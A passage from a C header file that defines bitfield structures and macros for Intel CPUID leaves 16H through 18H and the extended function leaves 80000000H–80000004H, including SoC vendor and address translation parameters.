    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 31:0] EDX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT 0
#define CPUID_EDX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EDX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_16;

/**
 * @defgroup CPUID_EAX_17 \
 *           EAX = 0x17
 *
 * When CPUID executes with EAX set to 17H, the processor returns information about the
 * System-On-Chip Vendor Attribute Enumeration.
 * @{
 */
#define CPUID_SOC_VENDOR_INFORMATION 0x00000017
/**
 * @brief System-On-Chip Vendor Attribute Enumeration Main Leaf (EAX = 17H, ECX = 0)
 *
 * @note Leaf 17H main leaf (ECX = 0). Leaf 17H output depends on the initial value in ECX. Leaf 17H
 * sub-leaves 1 through 3 reports SOC Vendor Brand String. Leaf 17H is valid if MaxSOCID_Index >= 3.
 * Leaf 17H sub-leaves 4 and above are reserved.
 */
typedef struct {
  union {
    struct {
      /**
       * [Bits 31:0] Reports the maximum input value of supported sub-leaf in leaf 17H.
       */
      UINT32 MaxSocIdIndex : 32;
#define CPUID_EAX_MAX_SOC_ID_INDEX_BIT 0
#define CPUID_EAX_MAX_SOC_ID_INDEX_FLAG 0xFFFFFFFF
#define CPUID_EAX_MAX_SOC_ID_INDEX_MASK 0xFFFFFFFF
#define CPUID_EAX_MAX_SOC_ID_INDEX(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 15:0] SOC Vendor ID.
       */
      UINT32 SocVendorId : 16;
#define CPUID_EBX_SOC_VENDOR_ID_BIT 0
#define CPUID_EBX_SOC_VENDOR_ID_FLAG 0xFFFF
#define CPUID_EBX_SOC_VENDOR_ID_MASK 0xFFFF
#define CPUID_EBX_SOC_VENDOR_ID(_) (((_) >> 0) & 0xFFFF)

      /**
       * [Bit 16] If 1, the SOC Vendor ID field is assigned via an industry standard enumeration
       * scheme. Otherwise, the SOC Vendor ID field is assigned by Intel.
       */
      UINT32 IsVendorScheme : 1;
#define CPUID_EBX_IS_VENDOR_SCHEME_BIT 16
#define CPUID_EBX_IS_VENDOR_SCHEME_FLAG 0x10000
#define CPUID_EBX_IS_VENDOR_SCHEME_MASK 0x01
#define CPUID_EBX_IS_VENDOR_SCHEME(_) (((_) >> 16) & 0x01)
      UINT32 Reserved1 : 15;
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 31:0] A unique number an SOC vendor assigns to its SOC projects.
       */
      UINT32 ProjectId : 32;
#define CPUID_ECX_PROJECT_ID_BIT 0
#define CPUID_ECX_PROJECT_ID_FLAG 0xFFFFFFFF
#define CPUID_ECX_PROJECT_ID_MASK 0xFFFFFFFF
#define CPUID_ECX_PROJECT_ID(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 31:0] A unique number within an SOC project that an SOC vendor assigns.
       */
      UINT32 SteppingId : 32;
#define CPUID_EDX_STEPPING_ID_BIT 0
#define CPUID_EDX_STEPPING_ID_FLAG 0xFFFFFFFF
#define CPUID_EDX_STEPPING_ID_MASK 0xFFFFFFFF
#define CPUID_EDX_STEPPING_ID(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_17_ECX_00;

/**
 * @brief System-On-Chip Vendor Attribute Enumeration Sub-leaf (EAX = 17H, ECX = 1..3)
 *
 * @note Leaf 17H output depends on the initial value in ECX. SOC Vendor Brand String is a UTF-8
 * encoded string padded with trailing bytes of 00H. The complete SOC Vendor Brand String is
 * constructed by concatenating in ascending order of EAX:EBX:ECX:EDX and from the sub-leaf 1
 * fragment towards sub-leaf 3.
 */
typedef struct {
  union {
    struct {
      /**
       * [Bits 31:0] SOC Vendor Brand String. UTF-8 encoded string.
       */
      UINT32 SocVendorBrandString : 32;
#define CPUID_EAX_SOC_VENDOR_BRAND_STRING_BIT 0
#define CPUID_EAX_SOC_VENDOR_BRAND_STRING_FLAG 0xFFFFFFFF
#define CPUID_EAX_SOC_VENDOR_BRAND_STRING_MASK 0xFFFFFFFF
#define CPUID_EAX_SOC_VENDOR_BRAND_STRING(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 31:0] SOC Vendor Brand String. UTF-8 encoded string.
       */
      UINT32 SocVendorBrandString : 32;
#define CPUID_EBX_SOC_VENDOR_BRAND_STRING_BIT 0
#define CPUID_EBX_SOC_VENDOR_BRAND_STRING_FLAG 0xFFFFFFFF
#define CPUID_EBX_SOC_VENDOR_BRAND_STRING_MASK 0xFFFFFFFF
#define CPUID_EBX_SOC_VENDOR_BRAND_STRING(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 31:0] SOC Vendor Brand String. UTF-8 encoded string.
       */
      UINT32 SocVendorBrandString : 32;
#define CPUID_ECX_SOC_VENDOR_BRAND_STRING_BIT 0
#define CPUID_ECX_SOC_VENDOR_BRAND_STRING_FLAG 0xFFFFFFFF
#define CPUID_ECX_SOC_VENDOR_BRAND_STRING_MASK 0xFFFFFFFF
#define CPUID_ECX_SOC_VENDOR_BRAND_STRING(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 31:0] SOC Vendor Brand String. UTF-8 encoded string.
       */
      UINT32 SocVendorBrandString : 32;
#define CPUID_EDX_SOC_VENDOR_BRAND_STRING_BIT 0
#define CPUID_EDX_SOC_VENDOR_BRAND_STRING_FLAG 0xFFFFFFFF
#define CPUID_EDX_SOC_VENDOR_BRAND_STRING_MASK 0xFFFFFFFF
#define CPUID_EDX_SOC_VENDOR_BRAND_STRING(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_17_ECX_01_03;

/**
 * @brief System-On-Chip Vendor Attribute Enumeration Sub-leaves (EAX = 17H, ECX > MaxSOCID_Index)
 *
 * @note Leaf 17H output depends on the initial value in ECX.
 */
typedef struct {
  union {
    struct {
      /**
       * [Bits 31:0] Reserved = 0.
       */
      UINT32 Reserved : 32;
#define CPUID_EAX_RESERVED_BIT 0
#define CPUID_EAX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EAX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EAX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 31:0] Reserved = 0.
       */
      UINT32 Reserved : 32;
#define CPUID_EBX_RESERVED_BIT 0
#define CPUID_EBX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EBX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EBX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 31:0] Reserved = 0.
       */
      UINT32 Reserved : 32;
#define CPUID_ECX_RESERVED_BIT 0
#define CPUID_ECX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_ECX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_ECX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 31:0] Reserved = 0.
       */
      UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT 0
#define CPUID_EDX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EDX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_17_ECX_N;

/**
 * @}
 */

/**
 * @defgroup CPUID_EAX_18 \
 *           EAX = 0x18
 *
 * When CPUID executes with EAX set to 18H, the processor returns information about the
 * Deterministic Address Translation Parameters.
 * @{
 */
#define CPUID_DETERMINISTIC_ADDRESS_TRANSLATION_PARAMETERS 0x00000018
/**
 * @brief Deterministic Address Translation Parameters Main Leaf (EAX = 18H, ECX = 0)
 *
 * @note Each sub-leaf enumerates a different address translation structure.
 *       If ECX contains an invalid sub-leaf index, EAX/EBX/ECX/EDX return 0. Sub-leaf index n is
 * invalid if n exceeds the value that sub-leaf 0 returns in EAX. A sub-leaf index is also invalid
 * if EDX[4:0] returns 0. Valid sub-leaves do not need to be contiguous or in any particular order.
 * A valid sub-leaf may be in a higher input ECX value than an invalid sub-leaf or than a valid
 * sub-leaf of a higher or lower-level structure.
 */
typedef struct {
  union {
    struct {
      /**
       * [Bits 31:0] Reports the maximum input value of supported sub-leaf in leaf 18H.
       */
      UINT32 MaxSubLeaf : 32;
#define CPUID_EAX_MAX_SUB_LEAF_BIT 0
#define CPUID_EAX_MAX_SUB_LEAF_FLAG 0xFFFFFFFF
#define CPUID_EAX_MAX_SUB_LEAF_MASK 0xFFFFFFFF
#define CPUID_EAX_MAX_SUB_LEAF(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bit 0] 4K page size entries supported by this structure.
       */
      UINT32 PageEntries4KbSupported : 1;
#define CPUID_EBX_PAGE_ENTRIES_4KB_SUPPORTED_BIT 0
#define CPUID_EBX_PAGE_ENTRIES_4KB_SUPPORTED_FLAG 0x01
#define CPUID_EBX_PAGE_ENTRIES_4KB_SUPPORTED_MASK 0x01
#define CPUID_EBX_PAGE_ENTRIES_4KB_SUPPORTED(_) (((_) >> 0) & 0x01)

      /**
       * [Bit 1] 2MB page size entries supported by this structure.
       */
      UINT32 PageEntries2MbSupported : 1;
#define CPUID_EBX_PAGE_ENTRIES_2MB_SUPPORTED_BIT 1
#define CPUID_EBX_PAGE_ENTRIES_2MB_SUPPORTED_FLAG 0x02
#define CPUID_EBX_PAGE_ENTRIES_2MB_SUPPORTED_MASK 0x01
#define CPUID_EBX_PAGE_ENTRIES_2MB_SUPPORTED(_) (((_) >> 1) & 0x01)

      /**
       * [Bit 2] 4MB page size entries supported by this structure.
       */
      UINT32 PageEntries4MbSupported : 1;
#define CPUID_EBX_PAGE_ENTRIES_4MB_SUPPORTED_BIT 2
#define CPUID_EBX_PAGE_ENTRIES_4MB_SUPPORTED_FLAG 0x04
#define CPUID_EBX_PAGE_ENTRIES_4MB_SUPPORTED_MASK 0x01
#define CPUID_EBX_PAGE_ENTRIES_4MB_SUPPORTED(_) (((_) >> 2) & 0x01)

      /**
       * [Bit 3] 1 GB page size entries supported by this structure.
       */
      UINT32 PageEntries1GbSupported : 1;
#define CPUID_EBX_PAGE_ENTRIES_1GB_SUPPORTED_BIT 3
#define CPUID_EBX_PAGE_ENTRIES_1GB_SUPPORTED_FLAG 0x08
#define CPUID_EBX_PAGE_ENTRIES_1GB_SUPPORTED_MASK 0x01
#define CPUID_EBX_PAGE_ENTRIES_1GB_SUPPORTED(_) (((_) >> 3) & 0x01)
      UINT32 Reserved1 : 4;

      /**
       * [Bits 10:8] Partitioning (0: Soft partitioning between the logical processors sharing this
       * structure).
       */
      UINT32 Partitioning : 3;
#define CPUID_EBX_PARTITIONING_BIT 8
#define CPUID_EBX_PARTITIONING_FLAG 0x700
#define CPUID_EBX_PARTITIONING_MASK 0x07
#define CPUID_EBX_PARTITIONING(_) (((_) >> 8) & 0x07)
      UINT32 Reserved2 : 5;

      /**
       * [Bits 31:16] W = Ways of associativity.
       */
      UINT32 WaysOfAssociativity00 : 16;
#define CPUID_EBX_WAYS_OF_ASSOCIATIVITY_00_BIT 16
#define CPUID_EBX_WAYS_OF_ASSOCIATIVITY_00_FLAG 0xFFFF0000
#define CPUID_EBX_WAYS_OF_ASSOCIATIVITY_00_MASK 0xFFFF
#define CPUID_EBX_WAYS_OF_ASSOCIATIVITY_00(_) (((_) >> 16) & 0xFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 31:0] Number of Sets.
       */
      UINT32 NumberOfSets : 32;
#define CPUID_ECX_NUMBER_OF_SETS_BIT 0
#define CPUID_ECX_NUMBER_OF_SETS_FLAG 0xFFFFFFFF
#define CPUID_ECX_NUMBER_OF_SETS_MASK 0xFFFFFFFF
#define CPUID_ECX_NUMBER_OF_SETS(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 4:0] Translation cache type field.
       * - 00000b: Null (indicates this sub-leaf is not valid).
       * - 00001b: Data TLB.
       * - 00010b: Instruction TLB.
       * - 00011b: Unified TLB.
       * All other encodings are reserved.
       *
       * @note Some unified TLBs will allow a single TLB entry to satisfy data read/write and
       * instruction fetches. Others will require separate entries (e.g., one loaded on data
       * read/write and another loaded on an instruction fetch) . Please see the Intel(R) 64 and
       * IA-32 Architectures Optimization Reference Manual for details of a particular product.
       */
      UINT32 TranslationCacheTypeField : 5;
#define CPUID_EDX_TRANSLATION_CACHE_TYPE_FIELD_BIT 0
#define CPUID_EDX_TRANSLATION_CACHE_TYPE_FIELD_FLAG 0x1F
#define CPUID_EDX_TRANSLATION_CACHE_TYPE_FIELD_MASK 0x1F
#define CPUID_EDX_TRANSLATION_CACHE_TYPE_FIELD(_) (((_) >> 0) & 0x1F)

      /**
       * [Bits 7:5] Translation cache level (starts at 1).
       */
      UINT32 TranslationCacheLevel : 3;
#define CPUID_EDX_TRANSLATION_CACHE_LEVEL_BIT 5
#define CPUID_EDX_TRANSLATION_CACHE_LEVEL_FLAG 0xE0
#define CPUID_EDX_TRANSLATION_CACHE_LEVEL_MASK 0x07
#define CPUID_EDX_TRANSLATION_CACHE_LEVEL(_) (((_) >> 5) & 0x07)

      /**
       * [Bit 8] Fully associative structure.
       */
      UINT32 FullyAssociativeStructure : 1;
#define CPUID_EDX_FULLY_ASSOCIATIVE_STRUCTURE_BIT 8
#define CPUID_EDX_FULLY_ASSOCIATIVE_STRUCTURE_FLAG 0x100
#define CPUID_EDX_FULLY_ASSOCIATIVE_STRUCTURE_MASK 0x01
#define CPUID_EDX_FULLY_ASSOCIATIVE_STRUCTURE(_) (((_) >> 8) & 0x01)
      UINT32 Reserved1 : 5;

      /**
       * [Bits 25:14] Maximum number of addressable IDs for logical processors sharing this
       * translation cache.
       *
       * @note Add one to the return value to get the result.
       */
      UINT32 MaxAddressableIdsForLogicalProcessors : 12;
#define CPUID_EDX_MAX_ADDRESSABLE_IDS_FOR_LOGICAL_PROCESSORS_BIT 14
#define CPUID_EDX_MAX_ADDRESSABLE_IDS_FOR_LOGICAL_PROCESSORS_FLAG 0x3FFC000
#define CPUID_EDX_MAX_ADDRESSABLE_IDS_FOR_LOGICAL_PROCESSORS_MASK 0xFFF
#define CPUID_EDX_MAX_ADDRESSABLE_IDS_FOR_LOGICAL_PROCESSORS(_) (((_) >> 14) & 0xFFF)
      UINT32 Reserved2 : 6;
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_18_ECX_00;

/**
 * @brief Deterministic Address Translation Parameters Sub-leaf (EAX = 18H, ECX >= 1)
 *
 * @note Each sub-leaf enumerates a different address translation structure.
 *       If ECX contains an invalid sub-leaf index, EAX/EBX/ECX/EDX return 0. Sub-leaf index n is
 * invalid if n exceeds the value that sub-leaf 0 returns in EAX. A sub-leaf index is also invalid
 * if EDX[4:0] returns 0. Valid sub-leaves do not need to be contiguous or in any particular order.
 * A valid sub-leaf may be in a higher input ECX value than an invalid sub-leaf or than a valid
 * sub-leaf of a higher or lower-level structure.
 */
typedef struct {
  union {
    struct {
      /**
       * [Bits 31:0] EAX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EAX_RESERVED_BIT 0
#define CPUID_EAX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EAX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EAX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bit 0] 4K page size entries supported by this structure.
       */
      UINT32 PageEntries4KbSupported : 1;
#define CPUID_EBX_PAGE_ENTRIES_4KB_SUPPORTED_BIT 0
#define CPUID_EBX_PAGE_ENTRIES_4KB_SUPPORTED_FLAG 0x01
#define CPUID_EBX_PAGE_ENTRIES_4KB_SUPPORTED_MASK 0x01
#define CPUID_EBX_PAGE_ENTRIES_4KB_SUPPORTED(_) (((_) >> 0) & 0x01)

      /**
       * [Bit 1] 2MB page size entries supported by this structure.
       */
      UINT32 PageEntries2MbSupported : 1;
#define CPUID_EBX_PAGE_ENTRIES_2MB_SUPPORTED_BIT 1
#define CPUID_EBX_PAGE_ENTRIES_2MB_SUPPORTED_FLAG 0x02
#define CPUID_EBX_PAGE_ENTRIES_2MB_SUPPORTED_MASK 0x01
#define CPUID_EBX_PAGE_ENTRIES_2MB_SUPPORTED(_) (((_) >> 1) & 0x01)

      /**
       * [Bit 2] 4MB page size entries supported by this structure.
       */
      UINT32 PageEntries4MbSupported : 1;
#define CPUID_EBX_PAGE_ENTRIES_4MB_SUPPORTED_BIT 2
#define CPUID_EBX_PAGE_ENTRIES_4MB_SUPPORTED_FLAG 0x04
#define CPUID_EBX_PAGE_ENTRIES_4MB_SUPPORTED_MASK 0x01
#define CPUID_EBX_PAGE_ENTRIES_4MB_SUPPORTED(_) (((_) >> 2) & 0x01)

      /**
       * [Bit 3] 1 GB page size entries supported by this structure.
       */
      UINT32 PageEntries1GbSupported : 1;
#define CPUID_EBX_PAGE_ENTRIES_1GB_SUPPORTED_BIT 3
#define CPUID_EBX_PAGE_ENTRIES_1GB_SUPPORTED_FLAG 0x08
#define CPUID_EBX_PAGE_ENTRIES_1GB_SUPPORTED_MASK 0x01
#define CPUID_EBX_PAGE_ENTRIES_1GB_SUPPORTED(_) (((_) >> 3) & 0x01)
      UINT32 Reserved1 : 4;

      /**
       * [Bits 10:8] Partitioning (0: Soft partitioning between the logical processors sharing this
       * structure).
       */
      UINT32 Partitioning : 3;
#define CPUID_EBX_PARTITIONING_BIT 8
#define CPUID_EBX_PARTITIONING_FLAG 0x700
#define CPUID_EBX_PARTITIONING_MASK 0x07
#define CPUID_EBX_PARTITIONING(_) (((_) >> 8) & 0x07)
      UINT32 Reserved2 : 5;

      /**
       * [Bits 31:16] W = Ways of associativity.
       */
      UINT32 WaysOfAssociativity01 : 16;
#define CPUID_EBX_WAYS_OF_ASSOCIATIVITY_01_BIT 16
#define CPUID_EBX_WAYS_OF_ASSOCIATIVITY_01_FLAG 0xFFFF0000
#define CPUID_EBX_WAYS_OF_ASSOCIATIVITY_01_MASK 0xFFFF
#define CPUID_EBX_WAYS_OF_ASSOCIATIVITY_01(_) (((_) >> 16) & 0xFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 31:0] Number of Sets.
       */
      UINT32 NumberOfSets : 32;
#define CPUID_ECX_NUMBER_OF_SETS_BIT 0
#define CPUID_ECX_NUMBER_OF_SETS_FLAG 0xFFFFFFFF
#define CPUID_ECX_NUMBER_OF_SETS_MASK 0xFFFFFFFF
#define CPUID_ECX_NUMBER_OF_SETS(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 4:0] Translation cache type field.
       * - 00000b: Null (indicates this sub-leaf is not valid).
       * - 00001b: Data TLB.
       * - 00010b: Instruction TLB.
       * - 00011b: Unified TLB.
       * All other encodings are reserved.
       *
       * @note Some unified TLBs will allow a single TLB entry to satisfy data read/write and
       * instruction fetches. Others will require separate entries (e.g., one loaded on data
       * read/write and another loaded on an instruction fetch) . Please see the Intel(R) 64 and
       * IA-32 Architectures Optimization Reference Manual for details of a particular product.
       */
      UINT32 TranslationCacheTypeField : 5;
#define CPUID_EDX_TRANSLATION_CACHE_TYPE_FIELD_BIT 0
#define CPUID_EDX_TRANSLATION_CACHE_TYPE_FIELD_FLAG 0x1F
#define CPUID_EDX_TRANSLATION_CACHE_TYPE_FIELD_MASK 0x1F
#define CPUID_EDX_TRANSLATION_CACHE_TYPE_FIELD(_) (((_) >> 0) & 0x1F)

      /**
       * [Bits 7:5] Translation cache level (starts at 1).
       */
      UINT32 TranslationCacheLevel : 3;
#define CPUID_EDX_TRANSLATION_CACHE_LEVEL_BIT 5
#define CPUID_EDX_TRANSLATION_CACHE_LEVEL_FLAG 0xE0
#define CPUID_EDX_TRANSLATION_CACHE_LEVEL_MASK 0x07
#define CPUID_EDX_TRANSLATION_CACHE_LEVEL(_) (((_) >> 5) & 0x07)

      /**
       * [Bit 8] Fully associative structure.
       */
      UINT32 FullyAssociativeStructure : 1;
#define CPUID_EDX_FULLY_ASSOCIATIVE_STRUCTURE_BIT 8
#define CPUID_EDX_FULLY_ASSOCIATIVE_STRUCTURE_FLAG 0x100
#define CPUID_EDX_FULLY_ASSOCIATIVE_STRUCTURE_MASK 0x01
#define CPUID_EDX_FULLY_ASSOCIATIVE_STRUCTURE(_) (((_) >> 8) & 0x01)
      UINT32 Reserved1 : 5;

      /**
       * [Bits 25:14] Maximum number of addressable IDs for logical processors sharing this
       * translation cache.
       *
       * @note Add one to the return value to get the result.
       */
      UINT32 MaxAddressableIdsForLogicalProcessors : 12;
#define CPUID_EDX_MAX_ADDRESSABLE_IDS_FOR_LOGICAL_PROCESSORS_BIT 14
#define CPUID_EDX_MAX_ADDRESSABLE_IDS_FOR_LOGICAL_PROCESSORS_FLAG 0x3FFC000
#define CPUID_EDX_MAX_ADDRESSABLE_IDS_FOR_LOGICAL_PROCESSORS_MASK 0xFFF
#define CPUID_EDX_MAX_ADDRESSABLE_IDS_FOR_LOGICAL_PROCESSORS(_) (((_) >> 14) & 0xFFF)
      UINT32 Reserved2 : 6;
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_18_ECX_01P;

/**
 * @}
 */

/**
 * @brief Extended Function CPUID Information
 *
 * When CPUID executes with EAX set to 80000000H, the processor returns the highest value the
 * processor recognizes for returning extended processor information. The value is returned in the
 * EAX register and is processor specific.
 */
#define CPUID_EXTENDED_FUNCTION_INFORMATION 0x80000000
typedef struct {
  union {
    struct {
      /**
       * [Bits 31:0] Maximum Input Value for Extended Function CPUID Information.
       */
      UINT32 MaxExtendedFunctions : 32;
#define CPUID_EAX_MAX_EXTENDED_FUNCTIONS_BIT 0
#define CPUID_EAX_MAX_EXTENDED_FUNCTIONS_FLAG 0xFFFFFFFF
#define CPUID_EAX_MAX_EXTENDED_FUNCTIONS_MASK 0xFFFFFFFF
#define CPUID_EAX_MAX_EXTENDED_FUNCTIONS(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 31:0] EBX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EBX_RESERVED_BIT 0
#define CPUID_EBX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EBX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EBX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 31:0] ECX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_ECX_RESERVED_BIT 0
#define CPUID_ECX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_ECX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_ECX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 31:0] EDX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT 0
#define CPUID_EDX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EDX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_80000000;

/**
 * Extended Function CPUID Information.
 */
#define CPUID_EXTENDED_CPU_SIGNATURE 0x80000001
typedef struct {
  union {
    struct {
      /**
       * [Bits 31:0] EAX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EAX_RESERVED_BIT 0
#define CPUID_EAX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EAX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EAX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 31:0] EBX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EBX_RESERVED_BIT 0
#define CPUID_EBX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EBX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EBX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bit 0] LAHF/SAHF available in 64-bit mode.
       */
      UINT32 LahfSahfAvailableIn64BitMode : 1;
#define CPUID_ECX_LAHF_SAHF_AVAILABLE_IN_64_BIT_MODE_BIT 0
#define CPUID_ECX_LAHF_SAHF_AVAILABLE_IN_64_BIT_MODE_FLAG 0x01
#define CPUID_ECX_LAHF_SAHF_AVAILABLE_IN_64_BIT_MODE_MASK 0x01
#define CPUID_ECX_LAHF_SAHF_AVAILABLE_IN_64_BIT_MODE(_) (((_) >> 0) & 0x01)
      UINT32 Reserved1 : 4;

      /**
       * [Bit 5] LZCNT.
       */
      UINT32 Lzcnt : 1;
#define CPUID_ECX_LZCNT_BIT 5
#define CPUID_ECX_LZCNT_FLAG 0x20
#define CPUID_ECX_LZCNT_MASK 0x01
#define CPUID_ECX_LZCNT(_) (((_) >> 5) & 0x01)
      UINT32 Reserved2 : 2;

      /**
       * [Bit 8] PREFETCHW.
       */
      UINT32 Prefetchw : 1;
#define CPUID_ECX_PREFETCHW_BIT 8
#define CPUID_ECX_PREFETCHW_FLAG 0x100
#define CPUID_ECX_PREFETCHW_MASK 0x01
#define CPUID_ECX_PREFETCHW(_) (((_) >> 8) & 0x01)
      UINT32 Reserved3 : 23;
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      UINT32 Reserved1 : 11;

      /**
       * [Bit 11] SYSCALL/SYSRET available in 64-bit mode.
       */
      UINT32 SyscallSysretAvailableIn64BitMode : 1;
#define CPUID_EDX_SYSCALL_SYSRET_AVAILABLE_IN_64_BIT_MODE_BIT 11
#define CPUID_EDX_SYSCALL_SYSRET_AVAILABLE_IN_64_BIT_MODE_FLAG 0x800
#define CPUID_EDX_SYSCALL_SYSRET_AVAILABLE_IN_64_BIT_MODE_MASK 0x01
#define CPUID_EDX_SYSCALL_SYSRET_AVAILABLE_IN_64_BIT_MODE(_) (((_) >> 11) & 0x01)
      UINT32 Reserved2 : 8;

      /**
       * [Bit 20] Execute Disable Bit available.
       */
      UINT32 ExecuteDisableBitAvailable : 1;
#define CPUID_EDX_EXECUTE_DISABLE_BIT_AVAILABLE_BIT 20
#define CPUID_EDX_EXECUTE_DISABLE_BIT_AVAILABLE_FLAG 0x100000
#define CPUID_EDX_EXECUTE_DISABLE_BIT_AVAILABLE_MASK 0x01
#define CPUID_EDX_EXECUTE_DISABLE_BIT_AVAILABLE(_) (((_) >> 20) & 0x01)
      UINT32 Reserved3 : 5;

      /**
       * [Bit 26] 1-GByte pages are available if 1.
       */
      UINT32 Pages1GbAvailable : 1;
#define CPUID_EDX_PAGES_1GB_AVAILABLE_BIT 26
#define CPUID_EDX_PAGES_1GB_AVAILABLE_FLAG 0x4000000
#define CPUID_EDX_PAGES_1GB_AVAILABLE_MASK 0x01
#define CPUID_EDX_PAGES_1GB_AVAILABLE(_) (((_) >> 26) & 0x01)

      /**
       * [Bit 27] RDTSCP and IA32_TSC_AUX are available if 1.
       */
      UINT32 RdtscpAvailable : 1;
#define CPUID_EDX_RDTSCP_AVAILABLE_BIT 27
#define CPUID_EDX_RDTSCP_AVAILABLE_FLAG 0x8000000
#define CPUID_EDX_RDTSCP_AVAILABLE_MASK 0x01
#define CPUID_EDX_RDTSCP_AVAILABLE(_) (((_) >> 27) & 0x01)
      UINT32 Reserved4 : 1;

      /**
       * [Bit 29] Intel(R) 64 Architecture available if 1.
       */
      UINT32 Ia64Available : 1;
#define CPUID_EDX_IA64_AVAILABLE_BIT 29
#define CPUID_EDX_IA64_AVAILABLE_FLAG 0x20000000
#define CPUID_EDX_IA64_AVAILABLE_MASK 0x01
#define CPUID_EDX_IA64_AVAILABLE(_) (((_) >> 29) & 0x01)
      UINT32 Reserved5 : 2;
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_80000001;

/**
 * Extended Function CPUID Information.
 */
#define CPUID_BRAND_STRING1 0x80000002

/**
 * Extended Function CPUID Information.
 */
#define CPUID_BRAND_STRING2 0x80000003

/**
 * Extended Function CPUID Information.
 */
#define CPUID_BRAND_STRING3 0x80000004
typedef struct {
  union {
    struct {
      /**
       * [Bits 31:0] Processor Brand String.
       */
      UINT32 ProcessorBrandString1 : 32;
#define CPUID_EAX_PROCESSOR_BRAND_STRING_1_BIT 0
#define CPUID_EAX_PROCESSOR_BRAND_STRING_1_FLAG 0xFFFFFFFF
#define CPUID_EAX_PROCESSOR_BRAND_STRING_1_MASK 0xFFFFFFFF
#define CPUID_EAX_PROCESSOR_BRAND_STRING_1(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
